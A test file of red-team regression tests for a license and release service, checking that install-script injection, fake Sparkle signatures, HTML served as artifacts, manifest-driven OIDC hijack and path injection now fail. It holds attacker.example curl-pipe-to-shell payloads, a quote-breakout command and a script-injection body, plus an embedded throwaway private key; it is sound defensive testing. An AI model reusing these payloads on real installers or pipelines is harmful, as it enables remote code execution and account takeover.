/**
 * RED TEAM R6 — Release-channel poisoning PoCs.
 *
 * Every test here is an ATTACK. They were written to assert the *vulnerable* behaviour;
 * post-remediation each one asserts that the same attack now FAILS. Test names are
 * unchanged so the mapping back to docs/security/findings/R6-release.md survives.
 *
 * Still-green attacks (R6-08 redirect handling, R6-09 CDATA, R6-10 downgrade, R6-11 portal,
 * and the request-Host origin) document findings that were deliberately NOT remediated in
 * this pass — see the Remediation section of the finding doc.
 */

import { describe, expect, it } from "vitest";
import { makeTestDb } from "../helpers.js";
import { KvMock } from "../kvMock.js";
import {
  makeEnv,
  mkReq,
  NOW,
  seedLicenseWithKey,
  seedProduct,
} from "../seed.js";
import type { Db } from "../../src/db/types.js";
import type { Env } from "../../src/env.js";
import type { Product } from "../../src/core/products.js";
import { loadProduct } from "../../src/core/products.js";
import { handleActivate } from "../../src/services/license/activation.js";
import {
  DEFAULT_AUTO_ISSUE,
  DEFAULT_FINGERPRINT_POLICY,
} from "../../src/fingerprint.js";
import { DEFAULT_SERVICES } from "../../src/core/services.js";
import type { FetchImpl } from "../../src/services/release/githubApp.js";
import type { Arch } from "../../src/services/release/assets.js";
import type {
  Release,
  ReleaseAsset,
} from "../../src/services/release/github.js";
import { handleReleaseSurface as handleRelease } from "../releaseSurface.js";
import { UPSTREAM_RATE_LIMIT } from "../../src/services/release/gateway.js";
import { renderAppcast } from "../../src/services/update/appcast.js";
import {
  defaultInstallScript,
  deriveVersionEnv,
  validateInstallContext,
} from "../../src/services/release/install.js";
import { linkRepo } from "../../src/services/release/linkRepo.js";
import { handleGithubWebhook } from "../../src/githubWebhook.js";
import { getReleaseConfig } from "../../src/services/release/index.js";
import { setReleaseAccess } from "../../src/services/release/config.js";
import {
  isSealedEnvelope,
  openManagedValue,
} from "../../src/admin/lib/managedSecrets.js";
import { handlePortalDownload } from "../../src/services/identity/portal/api.js";
import {
  createPortalDownloadToken,
  getOrCreateAccountByEmail,
  syncAccountLicenseLinks,
} from "../../src/services/identity/portal/repo.js";

// ── Shared harness ───────────────────────────────────────────────────────────

const SLUG = "djdl";

// A throwaway 2048-bit RSA private key (PKCS#8 PEM) so the App-JWT signer runs. Test only.
const TEST_RSA_PKCS8 = `-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCsEMREsWAll4vT
9mDM1zr8yF9klknqOJPqLj/1SvQx3IJNKks0LfEhPK+1LqTIrALhx3UM3N8hmmY6
Kk7C8cXsA0b49QtF/KtFPFnK+cSBGtOmZMJ7tJBQhUswWeJ2BPr24sDJZaCS4JH5
QlCi2g7Lchwkzp6d2H23rm9CD8LT6OPcgXnALdM4wfQ3Wa1gklDi0zd29FyKsdtF
3PjhzUVn7xRJQFOQU3vOqizauuYvM2WmV9K3BnkZZyPRgSVIEggBwlyrJLBSVZYI
8C2zmxLs7SeUaoq29rewma3h5mLhwL62VN0WC6B7rM18cifR0sR46VVc3/2gNAZ3
BxnHKG+TAgMBAAECggEAAvfVEuRGZs+a62CcIdxymYqxTpBjHQW103vRwZ714GhP
3RnmKzPBrZOY6lSwJgAFmrRwmfSzaqZ5rfYt3qICCoSx9Dhx5daqc6rLV7uAPsPi
M8QYML8YIDN0bRSX2fZTB/A4aCD3KKF0EysoLe76A1toDeB8jvd9j64UID0aXMJn
7UNX6BrmAj36r/gUZNiIPDQRg0RZV+weDv8Q0BG2yE6wpA2B5jdEJbX4jq7Tr2WU
3xJlG2GBOt1kNcaVKlr2FmF+3xFAdafJW/AYaMBL5EWytiMqP9bu/H3cm/laphKA
+phJ2fGgw094+ZS+fP2Qja7yqI6/6rDg53pGWCVuVQKBgQDhvS/Q8BM2dJIZUy+B
KZpZKuQSKvYvKvuNvjkuUSj8XA6AvfehcQWWJRngB7S1cYJoANsO3KvAyHQ4RUe9
s6AHDGJljnB/kfqMdQKbMtmw7u8MEtLRHCELZ0eVcd/8nHBmCgkCe1sj8OmXBVkN
pqW16lfsLu58g8u/qzPRrRQ+bwKBgQDDIaKwhhl0UD9+9wNBLZZ2lurLUiNnK4ZM
0yHaYselF8WkBRRlpTYJrEEYetlFLxToNlqk4VlWES0ZtJQ5SQJgqzG2cmMApvAJ
hurjuDBPaGcu56K7wUobYFbw9aNM7Nnm+Tpt+DehIJ48rjBMKSBAqLj2QXBSP+ST
QU/BYgbzHQKBgBFz+h1yYlnke2M/3j1jRQ691TJeZfhRn29fFLazCbMxPuHPTjUK
Mv9f0PdUQTGCHC4EWut0PkdCeFHdcWWGXMoOuBDYCXSjibaQWWo8bT5TyuGpFumZ
/igOjSdNzZ6PTdVl0zqA5RQLTVQi0rbOeqNtAe0916yC2B7ykqgUdKs7AoGBAI2L
MYsgywgPSe/cWDUIT5OYZ5qy61FkRhgmMvFKJA3Cj7ApqyEMVYVwuQt72W0Q+PZ0
rw3ZFUeUUAXMcpSXPC1JIVd55AzOC2KtxmcG7aw8TFS+29GcJRh0qrxBQoKDcJDW
CqdInXm4wm+73vbwAiBFA15GG6beB/01LBhX9jiVAoGBAM2aHdDaIHzO71WMB7Qi
6e6lkI53ovO8vzw/hITzvTqbEslxweqRjv0LHwMo1/+zdFtnxyWHUTFQtT4VM7FV
86FY7DjzErSUSOhQfXvKGVvy2oAYxQUqqJgHI2iowSMVNg1O45wW4O3eUsJuMx06
d+RKUGe97dQXkny7eE7qJPbg
-----END PRIVATE KEY-----`;

function envFor(kv: KvMock = new KvMock()): Env {
  const env = makeEnv(kv, [SLUG]);
  env.GITHUB_APP_ID = "12345";
  env.GITHUB_APP_PRIVATE_KEY = TEST_RSA_PKCS8;
  return env;
}

function asset(name: string, id = name.length, size = 4096): ReleaseAsset {
  return {
    id,
    name,
    size,
    content_type: "application/octet-stream",
    browser_download_url: `https://example/${name}`,
  };
}

function release(over: Partial<Release> = {}): Release {
  return {
    tag_name: "v1.2.3",
    name: "1.2.3",
    body: null,
    published_at: "2026-01-02T03:04:05Z",
    html_url: "https://github.com/acme/djdl/releases/tag/v1.2.3",
    prerelease: false,
    draft: false,
    assets: [],
    ...over,
  };
}

function makeProduct(slug = SLUG): Product {
  return {
    slug,
    name: slug,
    signingKid: "kid",
    // B5-12: the unseal is lazy — a fixture Product supplies the accessor, not a field.
    signingKey: async () => "pem",
    signingPub: null,
    compatMin: "0.0.0",
    compatMax: "99.0.0",
    defaultMaxOfflineDays: 30,
    defaultDeviceLimit: 5,
    adminGroup: null,
    schemaVersion: 1,
    fingerprintPolicy: DEFAULT_FINGERPRINT_POLICY,
    autoIssue: DEFAULT_AUTO_ISSUE,
    services: DEFAULT_SERVICES,
    registration: "requires-license",
  };
}

async function seedReleaseConfig(
  db: Db,
  over: Record<string, unknown> = {},
): Promise<void> {
  await seedProduct(db, SLUG);
  const row = {
    product: SLUG,
    gh_owner: "acme",
    gh_repo: "djdl",
    gh_installation_id: 42,
    channel_workflow: "channel.yml",
    beta_branch: "main",
    manual_channels_json: null as string | null,
    binary_name: "djdl",
    install_template: null as string | null,
    sparkle_ed25519_pub: "PUBKEY==",
    summary_marker: "pkey:summary",
    artifact_policy_json: null as string | null,
    metadata_access: "public",
    artifacts_access: "public",
    ...over,
  };
  await db.run(
    `INSERT INTO release_config
       (product, gh_owner, gh_repo, gh_installation_id, channel_workflow, beta_branch,
        manual_channels_json, binary_name, install_template, sparkle_ed25519_pub, summary_marker,
        artifact_policy_json, metadata_access, artifacts_access)
     VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
    row.product,
    row.gh_owner,
    row.gh_repo,
    row.gh_installation_id,
    row.channel_workflow,
    row.beta_branch,
    row.manual_channels_json,
    row.binary_name,
    row.install_template,
    row.sparkle_ed25519_pub,
    row.summary_marker,
    row.artifact_policy_json,
    row.metadata_access,
    row.artifacts_access,
  );
}

interface Call {
  url: string;
  init?: RequestInit;
}

/** URL-substring routed fetch stub that records the full (url, init) of every call. */
function stubFetch(routes: Array<[string, () => Response]>): {
  fetchImpl: FetchImpl;
  calls: Call[];
} {
  const calls: Call[] = [];
  const fetchImpl: FetchImpl = async (input, init) => {
    const url = String(input);
    calls.push({ url, ...(init ? { init } : {}) });
    if (url.includes("/access_tokens")) {
      return new Response(JSON.stringify({ token: "ghs_installation_token" }), {
        status: 200,
      });
    }
    for (const [needle, build] of routes) {
      if (url.includes(needle)) return build();
    }
    return new Response("not found", { status: 404 });
  };
  return { fetchImpl, calls };
}

function req(url = "https://key.plrs.im/djdl/version"): Request {
  return new Request(url) as unknown as Request;
}

// ── .pkey/ manifest harness (link + webhook resync) ──────────────────────────

function contentsResponse(text: string): Response {
  const b64 = Buffer.from(text, "utf8").toString("base64");
  return new Response(JSON.stringify({ content: b64, encoding: "base64" }), {
    status: 200,
  });
}

/** A mutable `.pkey/` file map so a test can "push a commit" between calls. */
function pkeyFetch(files: Record<string, string>): {
  fetchImpl: FetchImpl;
  calls: Call[];
  files: Record<string, string>;
} {
  const calls: Call[] = [];
  const fetchImpl: FetchImpl = async (input, init) => {
    const url = String(input);
    calls.push({ url, ...(init ? { init } : {}) });
    if (url.includes("/installation"))
      return new Response(JSON.stringify({ id: 4242 }), { status: 200 });
    if (url.includes("/access_tokens"))
      return new Response(JSON.stringify({ token: "ghs_installation_token" }), {
        status: 200,
      });
    if (url.includes("/contents/")) {
      for (const [path, body] of Object.entries(files)) {
        if (url.includes(`/contents/${path}`)) return contentsResponse(body);
      }
      return new Response("not found", { status: 404 });
    }
    return new Response("not found", { status: 404 });
  };
  return { fetchImpl, calls, files };
}

const SCHEMA_JSON = JSON.stringify({
  schemaVersion: 1,
  entries: [
    {
      key: "run.concurrency",
      kind: "config",
      category: "run",
      label: "Concurrency",
      description: "",
      schema: { type: "integer", minimum: 1 },
    },
  ],
});

const PRODUCT_JSON = JSON.stringify({
  slug: "acme",
  name: "Acme",
  compatMin: "1.0.0",
  compatMax: "9.0.0",
  adminGroup: "acme-admins",
  tiers: [{ id: "pro", label: "Pro" }],
});

/**
 * The same manifest as a repo *writer* would rewrite it: new IdP, new admin group, fat tier.
 *
 * `policyDeviceLimit` is 999 and not the 100,000 it used to be. A7-05 put a ceiling of
 * `MAX_DEVICE_LIMIT` (1,000) on every seat-cap write path, and this manifest is applied as ONE
 * document — so a six-figure limit now makes ingest reject the whole thing, and these tests
 * would pass for the wrong reason: not because the R6-05 gate held, but because the manifest
 * never parsed. 999 keeps the fixture hostile in the dimension these tests are about (a repo
 * push rewriting operator-owned policy) while staying inside the ceiling, so the R6-05 gap they
 * document stays visible. The ceiling itself is covered separately, below.
 */
const ATTACKER_PRODUCT_JSON = JSON.stringify({
  slug: "acme",
  name: "Acme",
  compatMin: "1.0.0",
  compatMax: "9.0.0",
  adminGroup: "attacker-controlled-group",
  oidc: {
    provider: "custom",
    issuer: "https://idp.attacker.example",
    clientId: "attacker-client",
    clientSecretSecret: "OIDC_SECRET__ACME",
    redirectUris: ["https://attacker.example/cb"],
    groupRoleMap: { everyone: { role: "admin" } },
  },
  tiers: [{ id: "pro", label: "Pro", policyDeviceLimit: 999 }],
});

/** The seat cap A7-05 refuses: `claimDeviceSeat`'s recursive CTE is O(limit) inside ONE
 *  statement, so this is a repo push that turns every later activation into a hang. */
const OVERSIZED_LIMIT_PRODUCT_JSON = JSON.stringify({
  slug: "acme",
  name: "Acme",
  compatMin: "1.0.0",
  compatMax: "9.0.0",
  adminGroup: "acme-admins",
  tiers: [{ id: "pro", label: "Pro", policyDeviceLimit: 100_000 }],
});

function releaseJson(over: Record<string, unknown> = {}): string {
  return JSON.stringify({
    release: {
      ghOwner: "acme-org",
      ghRepo: "acme-app",
      binaryName: "acme",
      betaBranch: "main",
      summaryMarker: "pkey:summary",
      sparkleEd25519Pub: "PUBKEY==",
      ...over,
    },
  });
}

function hex(bytes: Uint8Array): string {
  return [...bytes].map((b) => b.toString(16).padStart(2, "0")).join("");
}

/** Build a *validly HMAC-signed* GitHub push delivery. */
async function signedPush(
  payload: unknown,
  secret: string,
): Promise<{ body: string; signature: string }> {
  const body = JSON.stringify(payload);
  const key = await crypto.subtle.importKey(
    "raw",
    new TextEncoder().encode(secret),
    { name: "HMAC", hash: "SHA-256" },
    false,
    ["sign"],
  );
  const sig = new Uint8Array(
    await crypto.subtle.sign(
      "HMAC",
      key,
      new TextEncoder().encode(body) as BufferSource,
    ),
  );
  return { body, signature: `sha256=${hex(sig)}` };
}

function deliveryRequest(delivery: {
  body: string;
  signature: string;
}): Request {
  return new Request("https://key.plrs.im/webhooks/github", {
    method: "POST",
    headers: {
      "content-type": "application/json",
      "x-github-event": "push",
      "x-hub-signature-256": delivery.signature,
      // Derived from the signed bytes, so replaying the SAME captured delivery replays the
      // same GUID (that is the whole point of the R6-06 replay test) while distinct
      // deliveries get distinct GUIDs.
      "x-github-delivery": delivery.signature.slice(7, 43),
    },
    body: delivery.body,
  }) as unknown as Request;
}

function pushPayload(over: Record<string, unknown> = {}): unknown {
  return {
    ref: "refs/heads/main",
    after: "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
    // The installation `pkeyFetch` reports for this repo; the handler binds to it.
    installation: { id: 4242 },
    repository: {
      name: "acme-app",
      full_name: "acme-org/acme-app",
      default_branch: "main",
      owner: { login: "acme-org" },
    },
    head_commit: { modified: [".pkey/release.json"] },
    commits: [],
    ...over,
  };
}

// ═════════════════════════════════════════════════════════════════════════════
// R6-01 — install.sh RCE via repo-controlled binary_name
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-01 install.sh command injection via .pkey-controlled binaryName", () => {
  // FIXED (R6-01): `renderInstallScript` refuses to render a context outside its safe
  // character classes, so a legacy/poisoned `binary_name` fails closed with a 404 instead
  // of emitting a script with attacker lines above `set -eu`.
  it("a newline in binaryName injects arbitrary shell into the served installer", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db, {
      // Exactly what `String(rel.binaryName)` yields for a YAML/JSON block scalar.
      binary_name:
        "djdl\ncurl -fsSL https://attacker.example/rootkit.sh | sh\n#",
    });
    const { fetchImpl } = stubFetch([]);
    const res = await handleRelease(
      req("https://key.plrs.im/djdl/install.sh"),
      envFor(),
      db,
      makeProduct(),
      "install",
      {},
      fetchImpl,
    );
    expect(res.status).toBe(404);
    const script = await res.text();
    expect(script).not.toContain("attacker.example");
    expect(script.split("\n")).not.toContain(
      "curl -fsSL https://attacker.example/rootkit.sh | sh",
    );
    expect(res.headers.get("content-type")).not.toContain("text/x-shellscript");
  });

  // FIXED (R6-01): the same gate catches the quote-breakout variant.
  it("a double quote in binaryName breaks out of the quoted URL assignment", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db, {
      binary_name: 'djdl"; id > /tmp/pwned; :"',
    });
    const { fetchImpl } = stubFetch([]);
    const res = await handleRelease(
      req("https://key.plrs.im/djdl/install.sh"),
      envFor(),
      db,
      makeProduct(),
      "install",
      {},
      fetchImpl,
    );
    expect(res.status).toBe(404);
    const script = await res.text();
    expect(script).not.toContain("/tmp/pwned");
    expect(script).not.toContain("URL=");
  });

  // FIXED (R6-01): the manifest boundary rejects the whole `.pkey/` document, so the
  // poisoned `binary_name` never reaches `release_config` in the first place.
  it("END-TO-END: a push to .pkey/release.json rewrites binary_name and poisons install.sh", async () => {
    const db = makeTestDb();
    const env = envFor();
    env.GITHUB_WEBHOOK_SECRET = "webhook-secret";
    const stub = pkeyFetch({
      ".pkey/schema.json": SCHEMA_JSON,
      ".pkey/product.json": PRODUCT_JSON,
      ".pkey/release.json": releaseJson(),
    });

    const linked = await linkRepo(
      env,
      db,
      "acme-org/acme-app",
      NOW,
      stub.fetchImpl,
    );
    expect(linked.ok).toBe(true);
    expect((await getReleaseConfig(db, "acme"))?.binary_name).toBe("acme");

    // The attacker (anyone with push access to .pkey/ on the default branch) edits one field.
    stub.files[".pkey/release.json"] = releaseJson({
      binaryName: "acme\ncurl -fsSL https://attacker.example/x | sh\n#",
    });

    const res = await handleGithubWebhook(
      deliveryRequest(await signedPush(pushPayload(), "webhook-secret")),
      env,
      db,
      NOW + 10,
      stub.fetchImpl,
    );
    expect(res.status).toBe(200);
    const body = (await res.json()) as {
      ok: boolean;
      products: Array<{ ok: boolean; errors?: string[] }>;
    };
    // The resync failed manifest validation rather than applying the poisoned value.
    expect(body.ok).toBe(false);
    expect(body.products[0]?.errors?.join("\n")).toContain(
      "release.binaryName must match",
    );
    expect((await getReleaseConfig(db, "acme"))?.binary_name).toBe("acme");

    const installed = await handleRelease(
      req("https://key.plrs.im/acme/install.sh"),
      env,
      db,
      makeProduct("acme"),
      "install",
      {},
      stub.fetchImpl,
    );
    expect(installed.status).toBe(200);
    const script = await installed.text();
    expect(script).not.toContain("attacker.example");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-02 — install.sh ships no integrity verification at all
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-02 install.sh performs no integrity verification", () => {
  // FIXED (R6-02): the script fetches the artifact's published `.sha256`, verifies it, and
  // aborts before `chmod +x` on mismatch — or when no checksum is published at all.
  it("downloads → chmod +x → mv with no checksum, signature, or Gatekeeper check", () => {
    const script = defaultInstallScript({
      origin: "https://key.plrs.im",
      cliBase: "/djdl/release/dl",
      installPath: "/djdl/release/install.sh",
      binaryName: "djdl",
      channels: ["staging", "beta"],
      versionEnv: "DJDL_VERSION",
    });
    expect(script).toContain('curl -fL --progress-bar -o "$TMP" "$URL"');
    expect(script).toContain('wget -q -O "$TMP" "$URL"');

    // An integrity primitive is now emitted, for both download paths.
    expect(script).toContain('SHA_URL="$URL?checksum=sha256"');
    for (const token of [
      "shasum -a 256",
      "sha256sum",
      "openssl dgst -sha256",
    ]) {
      expect(script).toContain(token);
    }
    // Verification happens BEFORE the binary is made executable / moved into place.
    const lines = script.split("\n");
    const idx = (needle: string): number =>
      lines.findIndex((l) => l.includes(needle));
    expect(idx('ACTUAL_SHA256" != "$EXPECTED_SHA256')).toBeGreaterThan(-1);
    expect(idx('ACTUAL_SHA256" != "$EXPECTED_SHA256')).toBeLessThan(
      idx('chmod +x "$TMP"'),
    );
    expect(idx('ACTUAL_SHA256" != "$EXPECTED_SHA256')).toBeLessThan(
      idx('mv "$TMP" "$TARGET"'),
    );
    // No published checksum ⇒ refuse, rather than install unverified.
    expect(script).toContain('if [ -z "$EXPECTED_SHA256" ]; then');
    expect(script).toContain("Refusing to install an unverified binary.");
    // The false "the binary is expected to be notarized" claim is gone.
    expect(script.toLowerCase()).not.toContain("notariz");
  });

  it("serves the published .sha256 sidecar so the installer can verify the download", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db);
    const digest = "a".repeat(64);
    const rel = release({
      tag_name: "v1.2.3",
      assets: [asset("djdl-arm64", 777), asset("djdl-arm64.sha256", 778)],
    });
    const { fetchImpl } = stubFetch([
      [
        "/releases/tags/",
        () => new Response(JSON.stringify(rel), { status: 200 }),
      ],
      [
        "/releases/assets/778",
        () => new Response(`${digest}  djdl-arm64\n`, { status: 200 }),
      ],
    ]);
    const res = await handleRelease(
      req("https://key.plrs.im/djdl/cli/1.2.3/djdl-arm64?checksum=sha256"),
      envFor(),
      db,
      makeProduct(),
      "cli",
      { version: "1.2.3", arch: "arm64" },
      fetchImpl,
    );
    expect(res.status).toBe(200);
    expect((await res.text()).trim()).toBe(digest);

    // A release with no sidecar 404s, so `curl -fsSL` fails and the script aborts.
    const bare = release({
      tag_name: "v1.2.3",
      assets: [asset("djdl-arm64", 777)],
    });
    const { fetchImpl: noSums } = stubFetch([
      [
        "/releases/tags/",
        () => new Response(JSON.stringify(bare), { status: 200 }),
      ],
    ]);
    const missing = await handleRelease(
      req("https://key.plrs.im/djdl/cli/1.2.3/djdl-arm64?checksum=sha256"),
      envFor(),
      db,
      makeProduct(),
      "cli",
      { version: "1.2.3", arch: "arm64" },
      noSums,
    );
    expect(missing.status).toBe(404);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-03 — Sparkle edSignature is copied verbatim, never verified
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-03 Sparkle signature is relayed, not verified", () => {
  // FIXED (R6-03): the sidecar is Ed25519-verified against `sparkle_ed25519_pub` over the
  // DMG's own bytes; anything that does not verify drops the item and 404s the feed.
  it("copies arbitrary .sig bytes into sparkle:edSignature and never uses the configured pubkey", async () => {
    const db = makeTestDb();
    // A structurally valid Ed25519 public key that did NOT sign this DMG.
    await seedReleaseConfig(db, {
      sparkle_ed25519_pub: "Nk8lJcJ5X0m5eB1yPq0M9y0eYkWq3rZ8k6JX2Yr7cQI=",
    });
    const rel = release({
      assets: [
        asset("djdl-arm64.dmg", 100, 4096),
        asset("djdl-arm64.dmg.sig", 101),
      ],
    });
    const { fetchImpl } = stubFetch([
      [
        "/releases?per_page",
        () => new Response(JSON.stringify([rel]), { status: 200 }),
      ],
      // Not a signature at all — just attacker-chosen text in the sidecar asset.
      [
        "/releases/assets/101",
        () =>
          new Response("TOTALLY-BOGUS-NOT-A-SIGNATURE==\n", { status: 200 }),
      ],
      ["/releases/assets/100", () => new Response("DMG-BYTES")],
    ]);

    const res = await handleRelease(
      req("https://key.plrs.im/djdl/appcast.xml"),
      envFor(),
      db,
      makeProduct(),
      "appcast",
      {},
      fetchImpl,
    );
    expect(res.status).toBe(404);
    const xml = await res.text();
    expect(xml).not.toContain("sparkle:edSignature");
    expect(xml).not.toContain("TOTALLY-BOGUS-NOT-A-SIGNATURE==");
  });

  // FIXED (R6-03): a genuine signature over the DMG's bytes still renders, so the check is
  // a real verification and not a blanket denial.
  it("emits sparkle:edSignature only for a signature that verifies against the configured key", async () => {
    const db = makeTestDb();
    const dmgBytes = new TextEncoder().encode("REAL-DMG-BYTES");
    const pair = (await crypto.subtle.generateKey({ name: "Ed25519" }, true, [
      "sign",
      "verify",
    ])) as CryptoKeyPair;
    const b64 = (bytes: Uint8Array): string =>
      btoa(String.fromCharCode(...bytes));
    const pub = b64(
      new Uint8Array(
        (await crypto.subtle.exportKey("raw", pair.publicKey)) as ArrayBuffer,
      ),
    );
    const sigB64 = b64(
      new Uint8Array(
        await crypto.subtle.sign(
          { name: "Ed25519" },
          pair.privateKey,
          dmgBytes as BufferSource,
        ),
      ),
    );
    await seedReleaseConfig(db, { sparkle_ed25519_pub: pub });
    const rel = release({
      assets: [
        asset("djdl-arm64.dmg", 100, 4096),
        asset("djdl-arm64.dmg.sig", 101),
      ],
    });
    const { fetchImpl } = stubFetch([
      [
        "/releases?per_page",
        () => new Response(JSON.stringify([rel]), { status: 200 }),
      ],
      ["/releases/assets/101", () => new Response(sigB64)],
      [
        "/releases/assets/100",
        () => new Response(dmgBytes as unknown as BodyInit),
      ],
    ]);

    const res = await handleRelease(
      req("https://key.plrs.im/djdl/appcast.xml"),
      envFor(),
      db,
      makeProduct(),
      "appcast",
      {},
      fetchImpl,
    );
    expect(res.status).toBe(200);
    expect(await res.text()).toContain(`sparkle:edSignature="${sigB64}"`);
  });

  it("REPO-CONTROLLED POLICY: .pkey/release.json can set requireSparkleSignature:false and ship an unsigned feed", async () => {
    const db = makeTestDb();
    const env = envFor();
    env.GITHUB_WEBHOOK_SECRET = "webhook-secret";
    const stub = pkeyFetch({
      ".pkey/schema.json": SCHEMA_JSON,
      ".pkey/product.json": PRODUCT_JSON,
      ".pkey/release.json": releaseJson(),
    });
    expect(
      (await linkRepo(env, db, "acme-org/acme-app", NOW, stub.fetchImpl)).ok,
    ).toBe(true);
    // Before: a Sparkle key is configured, so an unsigned feed fails closed.
    expect((await getReleaseConfig(db, "acme"))?.sparkle_ed25519_pub).toBe(
      "PUBKEY==",
    );

    // The repo tries to disarm the platform's own signing requirement in one push.
    stub.files[".pkey/release.json"] = releaseJson({
      sparkleEd25519Pub: "",
      artifactPolicy: { requireSparkleSignature: false },
    });
    const hook = await handleGithubWebhook(
      deliveryRequest(await signedPush(pushPayload(), "webhook-secret")),
      env,
      db,
      NOW + 10,
      stub.fetchImpl,
    );
    expect(hook.status).toBe(200);
    const cfg = await getReleaseConfig(db, "acme");
    expect(cfg?.sparkle_ed25519_pub).toBeNull();
    // FIXED (R6-03): `requireSparkleSignature` is no longer part of the manifest contract,
    // so the push cannot write it into the operator-owned artifact policy.
    expect(cfg?.artifact_policy_json).not.toContain("requireSparkleSignature");

    // ...and the unsigned feed the repo was angling for now fails closed.
    const rel = release({ assets: [asset("acme-arm64.dmg", 100, 4096)] });
    const appcastFetch: FetchImpl = async (input) => {
      const url = String(input);
      if (url.includes("/access_tokens"))
        return new Response(JSON.stringify({ token: "t" }), { status: 200 });
      if (url.includes("/releases?per_page"))
        return new Response(JSON.stringify([rel]), { status: 200 });
      return new Response("nf", { status: 404 });
    };
    const res = await handleRelease(
      req("https://key.plrs.im/acme/appcast.xml"),
      env,
      db,
      makeProduct("acme"),
      "appcast",
      {},
      appcastFetch,
    );
    expect(res.status).toBe(404);
    expect(await res.text()).not.toContain(
      "/acme/release/dl/1.2.3/acme-arm64.dmg",
    );
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-04 — Artifact responses relay attacker Content-Type and strip Content-Disposition
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-04 artifact streaming relays a repo-chosen Content-Type with no nosniff", () => {
  it("serves text/html from the platform origin and drops the upstream Content-Disposition", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db);
    const rel = release({
      tag_name: "v1.2.3",
      assets: [asset("djdl-arm64", 777)],
    });
    const { fetchImpl } = stubFetch([
      [
        "/releases/tags/",
        () => new Response(JSON.stringify(rel), { status: 200 }),
      ],
      [
        "/releases/assets/777",
        () =>
          new Response(
            "<script>fetch('/manage/api/me').then(r=>r.text())</script>",
            {
              status: 200,
              headers: {
                // GitHub serves the asset's registered content_type…
                "Content-Type": "text/html; charset=utf-8",
                // …and a protective disposition the worker does NOT copy.
                "Content-Disposition": 'attachment; filename="djdl-arm64"',
              },
            },
          ),
      ],
    ]);

    const res = await handleRelease(
      req("https://key.plrs.im/djdl/cli/1.2.3/djdl-arm64"),
      envFor(),
      db,
      makeProduct(),
      "cli",
      { version: "1.2.3", arch: "arm64" },
      fetchImpl,
    );
    expect(res.status).toBe(200);
    // FIXED (R6-04): the repo-chosen upstream Content-Type is never relayed…
    expect(res.headers.get("content-type")).toBe("application/octet-stream");
    // …the protective disposition is always sent…
    expect(res.headers.get("content-disposition")).toBe(
      'attachment; filename="djdl-arm64"',
    );
    // …and every release response now carries the platform security headers.
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
    expect(res.headers.get("content-security-policy")).toContain(
      "default-src 'self'",
    );
    expect(res.headers.get("x-frame-options")).toBe("DENY");
    // The bytes still stream through — they simply can't execute as same-origin script.
    expect(await res.text()).toContain("<script>");
  });

  // NOT FIXED — R6-11 (origin from the request Host) is out of this remediation's scope.
  it("the served origin is taken from the request Host, not from configuration", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db);
    const { fetchImpl } = stubFetch([]);
    const res = await handleRelease(
      // `new URL(req.url).origin` — in workerd req.url is built from the Host header.
      req("https://attacker.example/djdl/install.sh"),
      envFor(),
      db,
      makeProduct(),
      "install",
      {},
      fetchImpl,
    );
    const script = await res.text();
    // Still Host-derived, but now emitted as a shell-quoted literal (R6-01).
    expect(script).toContain("ORIGIN='https://attacker.example'");
    expect(script).toContain(
      "curl -fsSL https://attacker.example/djdl/release/install.sh | sh",
    );
  });

  // FIXED (R6-04): `appSecurityHeaders` is applied to every release response.
  it("the appcast / install.sh surfaces carry no security headers either", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db);
    const { fetchImpl } = stubFetch([]);
    const res = await handleRelease(
      req("https://key.plrs.im/djdl/install.sh"),
      envFor(),
      db,
      makeProduct(),
      "install",
      {},
      fetchImpl,
    );
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
    expect(res.headers.get("content-security-policy")).toContain(
      "default-src 'self'",
    );
    expect(res.headers.get("x-frame-options")).toBe("DENY");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-05 — channel_workflow is interpolated raw into an authenticated GitHub URL
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-05 channel_workflow path/query injection on the installation-token client", () => {
  it("dot-segments in channel_workflow redirect the token-bearing GET to an arbitrary api.github.com path", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db, {
      // Manifest-controlled: `channelWorkflow: String(rel.channelWorkflow ?? "")` — unvalidated.
      channel_workflow: "../../../../../orgs/attacker-org/repos#",
    });
    const { fetchImpl, calls } = stubFetch([
      [
        "/releases?per_page",
        () =>
          new Response(JSON.stringify([release({ prerelease: true })]), {
            status: 200,
          }),
      ],
      // Whatever endpoint we actually hit answers 200 with a non-runs shape.
      ["api.github.com", () => new Response("[]", { status: 200 })],
    ]);

    // FIXED (R6-07): `channel_workflow` is encodeURIComponent'd, so the dot-segments stay
    // inside the workflow path segment and cannot re-target the request. The off-shape
    // response is also guarded, so the route no longer throws.
    const res = await handleRelease(
      req("https://key.plrs.im/djdl/beta/appcast.xml"),
      envFor(),
      db,
      makeProduct(),
      "channelAppcast",
      { channel: "beta" },
      fetchImpl,
    );
    expect(res.status).toBe(404);

    // No request ever normalised onto the injected endpoint — every GitHub call stayed
    // inside the configured repo.
    for (const call of calls) {
      const { pathname } = new URL(call.url);
      expect(pathname).not.toBe("/orgs/attacker-org/repos");
      expect(pathname.split("/")).not.toContain("orgs");
    }
    // …the workflow name stayed a single, encoded path segment.
    const runs = calls.find((c) => c.url.includes("/actions/workflows/"));
    expect(runs).toBeDefined();
    expect(new URL(runs!.url).pathname).toBe(
      "/repos/acme/djdl/actions/workflows/..%2F..%2F..%2F..%2F..%2Forgs%2Fattacker-org%2Frepos%23/runs",
    );
  });
});

// ═════════════════════════════════════════════════════════════════════════════
